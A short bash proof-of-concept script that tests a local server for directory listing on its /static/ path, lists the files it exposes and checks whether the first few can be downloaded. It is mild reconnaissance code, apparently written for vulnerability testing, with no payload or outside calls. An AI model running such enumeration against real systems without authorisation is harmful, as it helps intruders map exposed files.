#!/bin/bash

# POC: Directory Listing Enumeration on /static/ Endpoint
# This script demonstrates the directory listing vulnerability that allows
# unauthenticated attackers to enumerate all files in the /static/ directory

TARGET_URL="http://localhost:8080/static/"

echo "=========================================="
echo "Directory Listing Vulnerability POC"
echo "=========================================="
echo ""
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Check if directory listing is enabled
echo "[*] Test 1: Accessing /static/ directory..."
RESPONSE=$(curl -s -i "$TARGET_URL")

# Extract status code
STATUS_CODE=$(echo "$RESPONSE" | head -n 1)
echo "[+] Status Response: $STATUS_CODE"
echo ""

# Extract and display the response body
echo "[*] Test 2: Analyzing response content..."
BODY=$(curl -s "$TARGET_URL")

# Check for directory listing indicators
if echo "$BODY" | grep -q "Directory listing for"; then
    echo "[+] VULNERABLE: Directory listing is enabled!"
    echo ""
    echo "[*] Files/Directories found:"
    # Extract all file links from the directory listing
    echo "$BODY" | grep -oP '(?<=<a href=")[^"]+' | sed 's/">.*//g' | while read -r file; do
        echo "    - $file"
    done
    echo ""
else
    echo "[-] Directory listing does not appear to be enabled"
    exit 1
fi

# Test 3: Verify each file is accessible
echo "[*] Test 3: Verifying file accessibility..."
FILES=$(echo "$BODY" | grep -oP '(?<=<a href=")[^"]+' | sed 's/">.*//g' | head -3)

for file in $FILES; do
    FILE_URL="${TARGET_URL}${file}"
    FILE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$FILE_URL")
    if [ "$FILE_STATUS" == "200" ]; then
        FILE_SIZE=$(curl -s -w "%{size_download}" -o /dev/null "$FILE_URL")
        echo "[+] File accessible: $file (HTTP $FILE_STATUS, Size: $FILE_SIZE bytes)"
    else
        echo "[-] File not accessible: $file (HTTP $FILE_STATUS)"
    fi
done

echo ""
echo "[+] VULNERABILITY CONFIRMED: Directory listing enabled, all files enumerable"
echo ""